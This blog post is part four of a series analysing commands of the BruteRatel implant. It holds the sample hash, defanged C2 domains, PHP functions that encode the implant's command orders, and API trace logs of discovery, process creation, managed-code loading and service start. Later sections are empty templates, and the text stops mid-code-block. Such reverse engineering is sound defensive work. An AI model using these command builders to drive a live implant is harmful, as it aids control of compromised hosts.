---
title: "BruteRatel full command analysis (4/X)"
date: 2025-03-25 
---

<link rel="stylesheet" href="/css/main.css">

## BRUTERATEL COMMAND LIST PART 4 

## Context  

BruteRatel SHA256 : d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1  

Sample Source :  
[bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)   

VirusTotal :  
[VirusTotal](https://www.virustotal.com/gui/file/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1)  

Network / C2 :  
http://tiguanin[.]com/bazar.php:8041  
http://tiguanin[.]com/admin.php:8041  
http://bazarunet[.]com/admin.php:8041  
http://bazarunet[.]com/bazar.php:8041  
http://greshunka[.]com/bazar.php:8041  
http://greshunka[.]com/admin.php:8041  

# INTRO  

This article is the third part of my full analysis of BruteRatel commands : [Previous Part](https://cedricg-mirror.github.io/2025/03/19/BruteRatel3.html)  

This detailed analysis will be split into several parts, I will be presenting in this post the next 20 commands that BruteRatel can respond to.  

# COMMAND LIST

Here is a short description of the next 20 command codes and purpose :  

| Command ID   | Description             | Parameter         |
| :----------- | :---------------------- | :----------------:|
| "\x81\x98"  | [ASN1_unknown](#ASN1_unknown) | $p1 $p2 |
| "\x53\x49"   | [netshareenum](#netshareenum) | $servername, $level |
| "\x13\x52"  | [ExecWQLQuery](#ExecWQLQuery) | $query |
| "\xe7\x81"   | [GetAccountSidFromPid](#GetAccountSidFromPid) | $pid |
| "\x56\xf8   | [unknown](#unknown) | $p1 |
| "\x46\xcb"   | [unknown2](#unknown2) | $p1 |
| "\x32\x49"   | [unknown3](#unknown3) | NA |
| "\x92\x64"   | [EnumProcessModules](#EnumProcessModules) | $pid |
| "\x48\x73"   | [CreateProcessSuspended](#CreateProcessSuspended) | $processPath |
| "\x44\x80"   | [LoadManagedCode](#LoadManagedCode) | $binary |
| "\x56\x34   | [StartService](#StartService) | $MachineName, $ServiceName |
| "\x8E\xB9   | [NetSessionEnum](#NetSessionEnum) | $ServerName |
| "\x79\x75"   | [AD_Object_unknown](#AD_Object_unknown) | $p1, $p2, $p3 |
| "\x9a\xb9"   | [NetUserModalsGet](#NetUserModalsGet) | $ServerName |
| "\x9a\xb6"   | [GetScheduledTask](#GetScheduledTask) | $serverName |
| "\xb3\x29"   | [netshareenum2](#netshareenum2) | $servername |
| "\xa9\xe4"   | [InjectProcessShellcode](#InjectProcessShellcode) | $pid |
| "\xf3\xd8"   | [WtsEnumProcessA](#WtsEnumProcessA) | $RDServerName |
| "\xbf\xb"   | [UpdateConfig](#UpdateConfig) | $config |
| "\xa9\xb3"   | [count_exec_cmd](#count_exec_cmd) | $count, $sleep, $cmd |

In the following section, I share some dynamic analysis results from the aforementioned commands :  

<a id="ASN1_unknown"></a>
# ASN1_unknown

This function would require some reverse-engineering to maybe enable a runtime execution.  
It requires tow parameters of fixed size that are used to create an ASN.1 Decoder and Encoder.  

```php
/*
	$p1 : sizeof = 0x6DD
	$p2 : sizeof = 0x355
*/
function ASN1_unknown($p1, $p2)
{
	$p1_b64 = base64_encode($p1);
	$p2_b64 = base64_encode($p2);
	
	$cmd_id = "\x81\x98 $p1_b64 $p2_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```


<a id="netshareenum"></a>
# netshareenum  

```php
/*
	$level == 0 -> 501
	$level != 0 -> 502
*/
// ex: netshareenum("home", 1);
function netshareenum($servername, $level)
{
	$cmd_id = "\x53\x49 $servername $level";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [395]
[PTP] [0x798] [0x42c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000086686A68A0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Qbv+SP8fZwzhxBezUi1u9VBz"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000086686C4260
[PAR] DWORD   *pcbBinary : 0x000000866A5CE57C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x866a52bea1]
```

**II. Execution**   

```html
[CNT] [465]
[PTP] [0x798] [0xa1c] [c:\windows\system32\rundll32.exe]
[API] <NetShareEnum> in [srvcli.dll] 
[PAR] LMSTR   servername    : 0x00000086686AF3C0
[STR]         -> "home"
[PAR] DWORD   level         : 502
[PAR] LPBYTE* bufptr        : 0x000000866AB4F3A8
[PAR] DWORD   prefmaxlen    : 0xffffffff
[PAR] LPDWORD entriesread   : 0x00000086686AF3C0
[PAR] LPDWORD totalentries  : 0x00000086686AF3C0
[PAR] LPDWORD resume_handle : 0x00000086686AF3C0
[RET] [0x866a52ef14]
```

**III. Result**   

```html
[CNT] [470]
[PTP] [0x798] [0xa1c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000086686C4EB0
[STR]        -> "5349"
[STR]           "home"
[STR]           "AA"
[STR]           "ADMIN$|Administration à distance|C:\Windows"
[STR]           "C$|Partage par défaut|C:\"
[STR]           "IPC$|IPC distant|"
[PAR] DWORD  cbBinary   : 0xca
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000866868F4F0
[PAR] DWORD* pcchString : 0x000000866AB4F28C
[RET] [0x866a52e028]
```

<a id="ExecWQLQuery"></a>
# ExecWQLQuery  

```php
// ex: ExecWQLQuery("SELECT * FROM Win32_OperatingSystem");
function ExecWQLQuery($query)
{
	$cmd_id = "\x13\x52 $query";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000008556576190
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+UbrcSMtoCDXpwhieN05A5WEifA8/st/8JLmKKT4lWKO7Yj7ctJlQa7SbfuGuE7mAL7J6tMvLc9I2FQ=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000855658A620
[PAR] DWORD   *pcbBinary : 0x00000085585BE76C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x855851bea1]
```

**II. Execution**   

```html
[CNT] [351]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <CoInitializeEx> in [combase.dll] 
[RET] [0x8558533142]

[CNT] [352]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <CoInitializeSecurity> in [combase.dll] 
[RET] [0x855853317d]

[CNT] [353]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <CoCreateInstance> in [combase.dll] 
[PAR] REFCLSID  *clsid       : 0x0000008558537B90 ({4590F811-1D3A-11D0-891F-00AA004B2E24})
[PAR] LPUNKNOWN pUnkOuter    : 0x0
[PAR] DWORD     dwClsContext : 0x1
[PAR] REFIID    riid         : 0x0000008558537C90 (IWbemLocator)
[PAR] LPVOID    *ppv         : 0x00000085585BE600
[RET] [0x85585331aa]

[CNT] [354]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <IWbemLocator::ConnectServer> in [wbemprox.dll] 
[PAR] BSTR            strNetworkResource : 0x000000855657ED20
[STR]                 -> "ROOT\CIMV2"
[PAR] BSTR            strUser            : 0x0 (null)
[PAR] BSTR            strPassword        : 0x0 (null)
[PAR] BSTR            strLocale          : 0x0 (null)
[PAR] long            lSecurityFlags     : 0x0
[PAR] BSTR            strAuthority       : 0x0 (null)
[PAR] IWbemContext*   pCtx	             : 0x0
[PAR] IWbemServices** ppNamespace        : 0x00000085585BE608
[RET] [0x8558533208]

[CNT] [355]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <CoSetProxyBlanket> in [combase.dll] 
[PAR] IUnknown*                pProxy           : 0x000000855657ACD0
[PAR] DWORD                    dwAuthnSvc       : 0xffffffff
[PAR] DWORD                    dwAuthzSvc       : 0xffffffff
[PAR] OLECHAR*                 pServerPrincName : 0x0 (null)
[PAR] DWORD                    dwAuthnLevel     : 0x3
[PAR] DWORD                    dwImpLevel       : 0x3
[PAR] RPC_AUTH_IDENTITY_HANDLE pAuthInfo        : 0x0
[PAR] DWORD                    dwCapabilities   : 0x0
[RET] [0x85585332e4]

[CNT] [356]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <IWbemServices::ExecQuery> in [fastprox.dll] 
[PAR] BSTR                   strQueryLanguage : 0x0000008558538056
[STR]                        -> "WQL"
[PAR] BSTR                   strQuery         : 0x0000008556572BD0
[STR]                        -> "SELECT * FROM Win32_OperatingSystem"
[PAR] long                   lFlags           : 0x30 (WBEM_FLAG_RETURN_IMMEDIATELY | WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_ERROR_OBJECT | WBEM_FLAG_DONT_SEND_STATUS | WBEM_FLAG_SEND_ONLY_SELECTED)
[PAR] IWbemContext*          pCtx             : 0x0
[PAR] IEnumWbemClassObject** ppEnum           : 0x00000085585BE610
[RET] [0x8558533328]
```

**III. Result**   

```html
[CNT] [723]
[PTP] [0x8f8] [0xa44] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000085565B9510
[STR]        -> "1352"
[STR]           "ROOT\CIMV2"
[STR]           "BootDevice|\Device\HarddiskVolume1"
[STR]           "BuildNumber|9600"
[STR]           "BuildType|Multiprocessor Free"
[STR]           "Caption|Microsoft Windows 8.1 Professionnel"
[STR]           "CodeSet|1252"
[STR]           "CountryCode|33"
[STR]           "CreationClassName|Win32_OperatingSystem"
[STR]           "CSCreationClassName|Win32_ComputerSystem"
[STR]           "CSName|HOME"
[STR]           "CurrentTimeZone|60"
[STR]           "DataExecutionPrevention_32BitApplications|0"
[STR]           "DataExecutionPrevention_Available|0"
[STR]           "DataExecutionPrevention_Drivers|0"
[STR]           "DataExecutionPrevention_SupportPolicy|2"
[STR]           "Debug|0"
[STR]           "Description|"
[STR]           "Distributed|0"
[STR]           "EncryptionLevel|256"
[STR]           "ForegroundApplicationBoost|2"
[STR]           "FreePhysicalMemory|3459280"
[STR]           "FreeSpaceInPagingFiles|4194304"
[STR]           "FreeVirtualMemory|7713384"
[STR]           "InstallDate|20241022004215.000000+120"
[STR]           "LastBootUpTime|20250322183343.488256+060"
[STR]           "LocalDateTime|20250322183551.526000+060"
[STR]           "Locale|040c"
[STR]           "Manufacturer|Microsoft Corporation"
[STR]           "MaxNumberOfProcesses|4294967295"
[STR]           "MaxProcessMemorySize|137438953344"
[STR]           "MUILanguages|fr-FR"
[STR]           [TRUNCATED]
[PAR] DWORD  cbBinary   : 0xb9e
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000085565B74F0
[PAR] DWORD* pcchString : 0x00000085585BE49C
[RET] [0x855851e028]
```

<a id="GetAccountSidFromPid"></a>
# GetAccountSidFromPid  

```php
// ex: GetAccountSidFromPid(1952)
function GetAccountSidFromPid($pid)
{
	$cmd_id = "\xe7\x81 $pid";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000791AC09A80
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Ib/QSNMMNUn28Gv2Ui1u9VBz"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000791AC1A440
[PAR] DWORD   *pcbBinary : 0x000000791CABE7DC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x791ca1bea1]
```

**II. Execution**   

```html
[CNT] [335]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x000000791CABE298
[PAR] ACCESS_MASK         DesiredAccess    : 0x400 (PROCESS_QUERY_INFORMATION)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x000000791CABE2C0
[PAR] PCLIENT_ID          ClientId         : 0x000000791CABE2B0
[RET] [0x791ca34aab]

[CNT] [336]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcessToken> in [ntdll.dll] 
[PAR] HANDLE      ProcessHandle : 0x2f0
[PAR] ACCESS_MASK DesiredAccess : 0xa (TOKEN_DUPLICATE | TOKEN_QUERY)
[PAR] PHANDLE     TokenHandle   : 0x000000791CABE2A0
[RET] [0x791ca34b2f]

[CNT] [337]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[API] <DuplicateTokenEx> in [ADVAPI32.dll] 
[RET] [0x791ca2058c]

[CNT] [338]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[API] <GetTokenInformation> in [ADVAPI32.dll] 
[PAR] HANDLE                  TokenHandle            : 0x2f4
[PAR] TOKEN_INFORMATION_CLASS TokenInformationClass  : 0x1(TokenUser)
[PAR] LPVOID                  TokenInformation       : 0x0
[PAR] DWORD                   TokenInformationLength : 0x0
[PAR] PDWORD                  ReturnLength           : 0x000000791CABE284
[RET] [0x791ca20611]

[CNT] [339]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[API] <GetTokenInformation> in [ADVAPI32.dll] 
[PAR] HANDLE                  TokenHandle            : 0x2f4
[PAR] TOKEN_INFORMATION_CLASS TokenInformationClass  : 0x1(TokenUser)
[PAR] LPVOID                  TokenInformation       : 0x000000791AC0A0C0
[PAR] DWORD                   TokenInformationLength : 0x2c
[PAR] PDWORD                  ReturnLength           : 0x000000791CABE284
[RET] [0x791ca20648]

[CNT] [340]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[API] <LookupAccountSidW> in [ADVAPI32.dll] 
[PAR] LPCWSTR       lpSystemName            : 0x0 (null)
[PAR] PSID          lpSid                   : 0x000000791AC0A0D0
[PAR] LPTSTR        lpName                  : 0x000000791CABE2F0
[PAR] LPDWORD       cchName                 : 0x000000791CABE288
[PAR] LPTSTR        lpReferencedDomainName  : 0x000000791CABE4F8
[PAR] LPDWORD       cchReferencedDomainName : 0x000000791CABE288
[PAR] PSID_NAME_USE peUse                   : 0x000000791CABE28C
[RET] [0x791ca20678]

```

**III. Result**   

```html
[CNT] [348]
[PTP] [0x5ac] [0x64c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000791AC1A0B0
[STR]        -> "E781"
[STR]           "home\user"
[PAR] DWORD  cbBinary   : 0x1c
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000791AC1CB90
[PAR] DWORD* pcchString : 0x000000791CABE1BC
[RET] [0x791ca1e028]
```

<a id="unknown"></a>
# unknown  

No direct interation with the infected Host  
Some internal operation with the malware's configuration, related to the HTTP access Token.
I'll update later on after some more static analysis.  


<a id="unknown2"></a>
# unknown2  

No direct interation with the infected Host  
Samme, this command free some memory allocated within the malware's global structure, todo..  

<a id="unknown3"></a>
# unknown3  

todo

<a id="EnumProcessModules"></a>
# EnumProcessModules  

```php
// ex: EnumProcessModules(3048);
function EnumProcessModules($pid)
{
	$cmd_id = "\x92\x64 $pid";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000004EA881B250
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+f+bESNMiH0j01mv2Ui1u9VBz"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000004EA8828B40
[PAR] DWORD   *pcbBinary : 0x0000004EAA81E5EC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x4eaa77bea1]
```

**II. Execution**   

```html
[CNT] [340]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x0000004EAA81C0D8
[PAR] ACCESS_MASK         DesiredAccess    : 0x410 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x0000004EAA81C500
[PAR] PCLIENT_ID          ClientId         : 0x0000004EAA81C2F8
[RET] [0x4eaa794aab]

[CNT] [341]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[API] <GetProcessImageFileNameW> in [PSAPI.DLL] 
[PAR] HANDLE hProcess        : 0x2f8
[PAR] LPWSTR lpImageFileName : 0x0000004EAA81C0F0
[PAR] DWORD  nSize           : 0x104
[RET] [0x4eaa782a2b]

[CNT] [342]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[API] <EnumProcessModules> in [PSAPI.DLL] 
[PAR] HANDLE   hProcess   : 0x2f8 
[PAR] HMODULE  *lphModule : 0x0000004EAA81C500
[PAR] DWORD    cb         : 0x2000
[PAR] LPDWORD  lpcbNeeded : 0x0000004EAA81C0D4
[RET] [0x4eaa782a60]

[CNT] [370]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[API] <GetModuleFileNameExW> in [PSAPI.DLL] 
[PAR] HANDLE  hProcess   : 0x2f8 
[PAR] HMODULE hModule    : 0x00007FFFAFD00000 (ntdll.dll)
[PAR] LPWSTR  lpFilename : 0x0000004EAA81C2F8
[PAR] DWORD   nSize      : 0x104
[RET] [0x4eaa782b07]

[CNT] [371]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[API] <GetFileVersionInfoSizeW> in [version.dll] 
[PAR] LPCWSTR lptstrFilename : 0x0000004EAA81C2F8
[STR]         -> "C:\Windows\SYSTEM32\ntdll.dll"
[PAR] LPDWORD lpdwHandle     : 0x0000004EAA81C014
[RET] [0x4eaa77e782]

[...]
```

**III. Result**   

```html
[CNT] [832]
[PTP] [0x76c] [0x864] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000004EA883B020
[STR]        -> "9264"
[STR]           "25"
[STR]           "\Device\HarddiskVolume2\Users\user\Desktop\Graphical Loader.exe"
[STR]           "0x00007FFFAFD00000|C:\Windows\SYSTEM32\ntdll.dll|Microsoft Corporation|DLL Couche NT"
[STR]           "0x00007FFFAE220000|C:\Windows\system32\KERNEL32.DLL|Microsoft Corporation|DLL du client API BASE Windows NT"
[STR]           "0x00007FFFAD260000|C:\Windows\system32\KERNELBASE.dll|Microsoft Corporation|DLL du client API BASE Windows NT"
[STR]           "0x00007FFFAB9F0000|C:\Windows\system32\apphelp.dll|Microsoft Corporation|Fichier DLL du client de compatibilité des appl"
[STR]           "ications"
[STR]           "0x00007FFFAD3C0000|C:\Windows\system32\USER32.dll|Microsoft Corporation|DLL client de l’API uilisateur de Windows multi-"
[STR]           "utilisateurs"
[STR]           "0x00007FFFAD550000|C:\Windows\system32\GDI32.dll|Microsoft Corporation|GDI Client DLL"
[STR]           "0x00007FFFAE3C0000|C:\Windows\system32\COMDLG32.dll|Microsoft Corporation|DLL commune de boîtes de dialogues"
[STR]           "0x00007FFFAD6B0000|C:\Windows\system32\ADVAPI32.dll|Microsoft Corporation|API avancées Windows 32"
[STR]           "0x00007FFFAE680000|C:\Windows\system32\SHELL32.dll|Microsoft Corporation|DLL commune du shell Windows"
[STR]           "0x00007FFFAE5D0000|C:\Windows\system32\msvcrt.dll|Microsoft Corporation|Windows NT CRT DLL"
[STR]           "0x00007FFFAE360000|C:\Windows\system32\SHLWAPI.dll|Microsoft Corporation|Bibliothèque d’utilitaires légers du Shell"
[STR]           "0x00007FFFAAA80000|C:\Windows\WinSxS\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.9600.17415_none_624048"
[STR]           "6fecbd8abb\COMCTL32.dll|Microsoft Corporation|Bibliothèque de contrôles de l’expérience utilisateur"
[STR]           "0x00007FFFAFC20000|C:\Windows\SYSTEM32\sechost.dll|Microsoft Corporation|Host for SCM/SDDL/LSA Lookup APIs"
[STR]           "0x00007FFFAE480000|C:\Windows\system32\RPCRT4.dll|Microsoft Corporation|Runtime d’appel de procédure distante"
[STR]           [TRUNCATED]
[PAR] DWORD  cbBinary   : 0x152e
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000004EA8837100
[PAR] DWORD* pcchString : 0x0000004EAA81C01C
[RET] [0x4eaa77e028]
```

<a id="CreateProcessSuspended"></a>
# CreateProcessSuspended  

```php
// ex: CreateProcessSuspended("notepad")
function CreateProcessSuspended($processPath)
{
	$cmd_id = "\x48\x73 $processPath";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [361]
[PTP] [0x95c] [0x410] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000017A8DC3EC0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+R8PYSPw1Z0jhzxSjJEwSvx9udygI3A=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000017A8DCD760
[PAR] DWORD   *pcbBinary : 0x00000017AAD8EB2C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x17aacbbea1]
```

**II. Execution**   

```html
[CNT] [384]
[PTP] [0x95c] [0x1e0] [c:\windows\system32\rundll32.exe]
[API] <CreatePipe> in [KERNEL32.DLL] 
[PAR] PHANDLE               hReadPipe        : 0x00000017AB2FE2B8
[PAR] PHANDLE               hWritePipe       : 0x00000017AB2FE2C0
[PAR] LPSECURITY_ATTRIBUTES lpPipeAttributes : 0x00000017AB2FE2F8
[PAR] DWORD                 nSize            : 0x0
[RET] [0x17aaccb70d]

[ * ] [pid 0x95c][tid 0x1e0] c:\windows\system32\rundll32.exe
[API] <CreatePipe>
[PAR] HANDLE  hReadPipe  : 0x2fc
[PAR] HANDLE  hWritePipe : 0x30c
[RES] BOOL 0x1

[CNT] [385]
[PTP] [0x95c] [0x1e0] [c:\windows\system32\rundll32.exe]
[API] <SetHandleInformation> in [KERNEL32.DLL] 
[PAR] HANDLE hObject : 0x2fc
[PAR] DWORD dwMask   : 0x1
[PAR] DWORD dwFlags  : 0x0
[RET] [0x17aaccb72b]

[CNT] [394]
[PTP] [0x95c] [0x1e0] [c:\windows\system32\rundll32.exe]
[API] <CreateProcessA> in [KERNEL32.DLL] 
[PAR] LPCTSTR               lpApplicationName    : 0x0 (null)
[PAR] LPCTSTR               lpCommandLine        : 0x00000017A8DAC1E0
[STR]                       -> "notepad"
[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes  : 0x0
[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes   : 0x0
[PAR] BOOL                  bInheritHandles      : 0x1
[PAR] DWORD                 dwCreationFlags      : 0x8000004 (CREATE_NO_WINDOW | CREATE_SUSPENDED)
[PAR] LPVOID                lpEnvironment        : 0x0
[PAR] LPCSTR                lpCurrentDirectory   : 0x0 (null)
[PAR] LPSTARTUPINFOA        lpStartupInfo        : 0x00000017AB2FE310
[FLD]                       -> lpDesktop   = 0x0 (null)
[FLD]                       -> lpTitle     = 0x0 (null)
[FLD]                       -> dwFlags     = 0x100 (STARTF_USESTDHANDLES)
[FLD]                       -> wShowWindow = 0x0
[FLD]                       -> hStdInput   = 0x0
[FLD]                       -> hStdOutput  = 0x30c
[FLD]                       -> hStdError   = 0x30c
[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x00000017AB2FE2E0
[RET] [0x17aaccb8ee]
```

**III. Result**   

```html
[CNT] [410]
[PTP] [0x95c] [0x1e0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000017A8DCD2A0
[STR]        -> "B0E9"
[STR]           "AB 2968 1272 notepad"
[PAR] DWORD  cbBinary   : 0x32
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000017A8DE3810
[PAR] DWORD* pcchString : 0x00000017AB2FE17C
[RET] [0x17aacbe028]
```

<a id="LoadManagedCode"></a>
# LoadManagedCode  

```php
function LoadManagedCode($filename)
{
	$file = file_get_contents($filename);
	
	$p1_b64 = base64_encode($file);
	
	$cmd_id = "\x44\x80 $p1_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="StartService"></a>
# StartService  

```php
function StartService($MachineName, $ServiceName)
{
	$cmd_id = "\x56\x34 $MachineName $ServiceName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x410] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000C96B1E3C60
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+QuHESPwfZxLiwC6kHD5hsnoJYG0KtuqZac7/JBB0"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000C96B1EED40
[PAR] DWORD   *pcbBinary : 0x000000C96D09EB0C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xc96cffbea1]
```

**II. Execution**   

```html
[CNT] [337]
[PTP] [0x410] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <OpenSCManagerA> in [ADVAPI32.dll] 
[PAR] LPCSTR  lpMachineName   : 0x0 (null)
[PAR] LPCSTR  lpDatabaseName  : 0x000000C96D0188F4
[STR]         -> "ServicesActive"
[PAR] DWORD   dwDesiredAccess : 0xf003f (SC_MANAGER_ALL_ACCESS)
[RET] [0xc96d00dcc5]

[CNT] [338]
[PTP] [0x410] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <OpenServiceW> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hSCManager      : 0x6b201bd0 
[PAR] LPCWSTR   lpServiceName   : 0x000000C96B1F02D0
[STR]           -> "evil"
[PAR] DWORD     dwDesiredAccess : 0xf01ff (SERVICE_ALL_ACCESS)
[RET] [0xc96d00dcf3]

[CNT] [339]
[PTP] [0x410] [0x81c] [c:\windows\system32\rundll32.exe]
[API] <StartServiceA> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hService            : 0x000000C96B202140
[PAR] DWORD     dwNumServiceArgs    : 0x0
[PAR] LPCTSTR*  lpServiceArgVectors : 0x0
[RET] [0xc96d00dd09]
```

**III. Result**   

```html

```

<a id="NetSessionEnum"></a>
# NetSessionEnum  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="AD_Object_unknown"></a>
# AD_Object_unknown  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="NetUserModalsGet"></a>
# NetUserModalsGet  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="GetScheduledTask"></a>
# GetScheduledTask  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="netshareenum2"></a>
# netshareenum2  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="InjectProcessShellcode"></a>
# InjectProcessShellcode  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="WtsEnumProcessA"></a>
# WtsEnumProcessA  

```php

```

**I. Fetching the order**  

```html

```

**II. Execution**   

```html

```

**III. Result**   

```html

```

<a id="UpdateConfig"></a>
# UpdateConfig  

```php

